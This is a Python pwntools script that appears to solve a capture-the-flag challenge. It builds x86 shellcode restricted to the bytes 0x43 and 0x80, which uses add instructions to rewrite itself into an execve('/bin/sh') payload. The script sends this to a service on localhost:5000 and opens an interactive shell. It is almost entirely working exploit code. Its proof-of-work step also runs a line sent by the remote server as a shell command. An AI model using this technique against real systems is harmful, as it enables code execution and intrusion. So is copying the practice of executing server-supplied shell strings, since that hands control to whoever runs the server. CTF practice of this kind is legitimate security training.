from pwn import *
from subprocess import check_output

A43 = b'\x80\x43\x43\x43'  # add BYTE PTR [ebx+0x43],0x43
A80 = b'\x80\x43\x43\x80'  # add BYTE PTR [ebx+0x43],0x80
INC = b'\x43'              # inc ebx

def SET(val, orig=0x43):
    x43, x80 = table[orig][val]
    return A43 * x43 + A80 * x80

table = {}
for start in (0x43, 0x80):
    subtable = {}
    for x43 in range(256):
        for x80 in range(2):
            b = (start + 0x43 * x43 + 0x80 * x80) & 0xff
            if b not in subtable or x43 + x80 < sum(subtable[b]):
                subtable[b] = (x43, x80)
    table[start] = subtable

code = bytearray(b'\x43' * 4096)

"""
List of bytes reachable by fewer than 16 adds:
------------------------------------------------
 0: 43 80    1: 86 c3 00    2: 06 c9    3: 0c 49
 4: 4f 8c    5: 92 cf       6: 12 d5    7: 18 55
 8: 5b 98    9: 9e db      10: 1e e1   11: 24 61
12: 67 a4   13: aa e7      14: 2a ed   15: 30 6d
"""

# or bh, 0x0c (80 CF 0C)
enlarge_ebx_code = SET(0xcf) + INC + SET(0x0c)
n = len(enlarge_ebx_code)
code[:n] = enlarge_ebx_code
code[n:0x42] = INC * (0x42 - n)
code[0x42] = 0x80

ebx = 1 + 0xc00 + (0x42 - n)

# xor DWORD PTR [ebx], '/bin\x00'^0x43434343
# mov DWORD PTR [ebx+4], '/sh\x00'
# mov al, 11
# int 0x80
shellcode = bytes.fromhex('81 33 6C 21 2A 2D C7 43 04 2F 73 68 00 B0 0B CD 80')
craft_shellcode = b''

shellcode_addr = ebx + 0x43
for c in shellcode:
    if sum(table[0x80][c]) < sum(table[0x43][c]):
        code[shellcode_addr] = 0x80
        craft_shellcode += SET(c, 0x80) + INC
    else:
        craft_shellcode += SET(c) + INC
    shellcode_addr += 1

n = len(craft_shellcode)
assert 0x45 + n < ebx + 0x43, 'Shellcode out of range (%d >= %d) ' % (0x45 + n, ebx + 0x43)

code[0x45:0x45+n] = craft_shellcode

print(code.hex())

# io = process(['python3', 'chal.py'])
io = remote("localhost", 5000)

context.log_level = 'debug'

# pow
io.recvline()

print(len(code))

v = check_output(io.recvline().decode(), shell=True).replace(b"\n", b"")
print(v)
io.sendline(v)

io.sendlineafter(b'Please', code.hex().encode())
io.interactive()
